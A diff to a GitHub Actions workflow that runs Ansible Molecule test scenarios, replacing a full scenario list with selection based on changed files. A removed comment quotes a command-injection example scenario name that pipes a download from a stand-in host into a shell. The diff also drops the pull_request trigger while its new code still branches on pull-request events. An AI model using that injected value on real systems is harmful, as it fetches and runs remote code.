@@ -3,14 +3,9 @@ name: Molecule Test
 
 on:
   push:
-    branches: [main]
-  # Gate pull requests. Without this the per-scenario results only ever appeared
-  # on a develop->main promotion, i.e. after review, on main. See the header
-  # comment on the `molecule` job for what that hid.
-  pull_request:
-  # Callable so the upstream-revalidate listener can re-run role tests when
-  # terraform-proxmox cuts a release; manual trigger for ad-hoc runs.
-  workflow_call:
+    branches: [main, develop]
+  workflow_call: {}
+  # Manual trigger for ad-hoc full-matrix runs.
   workflow_dispatch:
 
 permissions:
@@ -44,61 +39,153 @@ jobs:
       - name: Verify bulk data comparison static safety contract
         run: python3 tests/pve_bulk_data_compare/test_contract.py
 
-  # The scenario list is DERIVED from the filesystem, never hand-maintained.
-  #
-  # It used to be a hand-written list of `molecule test -s <name>` steps, and
-  # that list had drifted to 11 of the 25 scenarios that exist. The 14 missing
-  # ones did not fail — they simply never ran, and a hand list has no way to
-  # report what it omits. A derived list cannot omit a scenario that exists.
+  # Discover scenarios and roles from the tree, then derive the PR matrix from
+  # role references. Shared inputs widen to every scenario; pushes run all.
   discover:
     name: Discover scenarios
     runs-on: ubuntu-latest
     outputs:
-      scenarios: ${{ steps.list.outputs.scenarios }}
+      scenarios: ${{ steps.select.outputs.scenarios }}
     steps:
       - name: Checkout
         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          fetch-depth: 0
 
-      - name: List every molecule scenario
-        id: list
+      - name: Select scenarios for this change
+        id: select
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
         run: |
           set -euo pipefail
-          # A scenario is a directory under molecule/ containing molecule.yml.
-          # -printf '%h' gives the directory; sed takes the basename. Avoids
-          # piping find output through xargs, which mishandles odd filenames.
-          names=$(
+          mapfile -t all_scenarios < <(
             find molecule -mindepth 2 -maxdepth 2 -name molecule.yml \
               -printf '%h\n' | sed 's#.*/##' | sort
           )
-
-          # Allow-list the names before they can reach a matrix value. This
-          # workflow runs on pull_request, so a directory name is attacker-
-          # controlled input: a scenario called `x; curl evil.sh | sh` would
-          # otherwise be interpolated straight into a shell. The run step below
-          # additionally takes the name through env rather than GitHub
-          # expression interpolation — both controls, not either.
-          #
-          # NB: do not write a literal GitHub expression anywhere in a run
-          # block, including in a shell comment. The runner substitutes them
-          # before bash ever sees the script, so an empty one is a workflow
-          # parse error that fails the whole file at startup with no job logs.
-          if bad=$(grep -vE '^[a-z0-9_]+$' <<<"$names"); [ -n "$bad" ]; then
-            echo "::error::Rejected molecule scenario name(s) outside [a-z0-9_]: $bad"
+          if [ "${#all_scenarios[@]}" -eq 0 ]; then
+            echo "::error::No Molecule scenarios discovered."
             exit 1
           fi
-
-          scenarios=$(jq -R . <<<"$names" | jq -sc .)
-          count=$(jq 'length' <<<"$scenarios")
-          if [ "$count" -eq 0 ]; then
-            echo "::error::No molecule scenarios discovered — refusing to report a vacuous pass."
+          mapfile -t role_names < <(find roles -mindepth 1 -maxdepth 1 -type d -printf '%f\n' | sort)
+          if [ "${#role_names[@]}" -eq 0 ]; then
+            echo "::error::No Ansible roles discovered."
             exit 1
           fi
-          echo "Discovered $count scenarios: $scenarios"
-          echo "scenarios=$scenarios" >> "$GITHUB_OUTPUT"
+          for role in "${role_names[@]}"; do
+            if [[ ! "$role" =~ ^[a-z0-9_]+$ ]]; then
+              echo "::error::Rejected role name outside [a-z0-9_]."
+              exit 1
+            fi
+          done
+          role_pattern=$(printf '%s|' "${role_names[@]}")
+          role_pattern=${role_pattern%|}
+          for scenario in "${all_scenarios[@]}"; do
+            if [[ ! "$scenario" =~ ^[a-z0-9_]+$ ]]; then
+              echo "::error::Rejected scenario name outside [a-z0-9_]."
+              exit 1
+            fi
+            if ! grep -R -E -q -w --include='*.yml' --include='*.yaml' \
+              -- "$role_pattern" "molecule/$scenario"; then
+              echo "::error::Scenario has no resolvable role references."
+              exit 1
+            fi
+          done
+
+          full_matrix=false
+          reason="no Molecule inputs changed"
+          selected_paths=$(mktemp)
+          trap 'rm -f "$selected_paths"' EXIT
+          if [ "$EVENT_NAME" != pull_request ]; then
+            full_matrix=true
+            reason="non-pull-request event"
+          else
+            if [ -z "$BASE_SHA" ]; then
+              echo "::error::Pull request base SHA is missing; refusing to narrow."
+              exit 1
+            fi
+            changed_paths=$(mktemp)
+            trap 'rm -f "$changed_paths"' EXIT
+            git diff --name-only -z "$BASE_SHA...HEAD" > "$changed_paths"
+            while IFS= read -r -d '' path; do
+              case "$path" in
+                roles/*/meta/*|molecule/shared/*|molecule/resources/*|.config/molecule/*|.github/workflows/*|.github/scripts/*|playbooks/*|requirements.yml|requirements-ci.txt|ansible.cfg)
+                  full_matrix=true
+                  reason="shared inputs changed"
+                  break
+                  ;;
+                roles/*/*)
+                  role=${path#roles/}
+                  role=${role%%/*}
+                  if [[ ! "$role" =~ ^[a-z0-9_]+$ || ! -d "roles/$role" ]]; then
+                    full_matrix=true
+                    reason="role path is not in the current tree"
+                    break
+                  fi
+                  # A role referenced by another role may affect multiple
+                  # scenarios; widen instead of guessing which dependents run.
+                  if grep -R -q -w --include='*.yml' --include='*.yaml' \
+                    --exclude-dir="$role" -- "$role" roles/; then
+                    full_matrix=true
+                    reason="role dependency changed"
+                    break
+                  fi
+                  hits=0
+                  while IFS= read -r -d '' candidate; do
+                    scenario=${candidate#molecule/}
+                    scenario=${scenario%%/*}
+                    if [ -f "molecule/$scenario/molecule.yml" ]; then
+                      if ! grep -F -q -x -- "$scenario" "$selected_paths"; then
+                        printf '%s\n' "$scenario" >> "$selected_paths"
+                      fi
+                      hits=1
+                    fi
+                  done < <(grep -R -l -Z -w --include='*.yml' --include='*.yaml' -- "$role" molecule/ || true)
+                  if [ "$hits" -eq 0 ]; then
+                    reason="changed role has no Molecule scenario"
+                  else
+                    reason="changed role coverage"
+                  fi
+                  ;;
+                molecule/*/*)
+                  scenario=${path#molecule/}
+                  scenario=${scenario%%/*}
+                  if [ -f "molecule/$scenario/molecule.yml" ]; then
+                    if ! grep -F -q -x -- "$scenario" "$selected_paths"; then
+                      printf '%s\n' "$scenario" >> "$selected_paths"
+                    fi
+                    reason="changed scenario coverage"
+                  else
+                    full_matrix=true
+                    reason="molecule path is not a known scenario"
+                    break
+                  fi
+                  ;;
+              esac
+            done < "$changed_paths"
+          fi
+
+          if [ "$full_matrix" = true ]; then
+            scenarios=("${all_scenarios[@]}")
+          else
+            mapfile -t scenarios < <(sort -u "$selected_paths")
+          fi
+          if [ "${#scenarios[@]}" -gt 0 ]; then
+            mapfile -t scenarios < <(printf '%s\n' "${scenarios[@]}" | sort -u)
+            scenario_json=$(printf '%s\n' "${scenarios[@]}" | jq -R . | jq -sc .)
+          else
+            scenario_json='[]'
+          fi
+          echo "scenarios=$scenario_json" >> "$GITHUB_OUTPUT"
+          echo "### Molecule selection" >> "$GITHUB_STEP_SUMMARY"
+          printf '\n%s; selected %s of %s scenarios.\n' \
+            "$reason" "${#scenarios[@]}" "${#all_scenarios[@]}" >> "$GITHUB_STEP_SUMMARY"
+          echo "$reason: $scenario_json"
 
   molecule:
     name: Molecule (${{ matrix.scenario }})
     needs: discover
+    if: ${{ needs.discover.outputs.scenarios != '[]' }}
     runs-on: ubuntu-latest
     strategy:
       # LOAD-BEARING. These ran as serial steps in one job, so the first failing
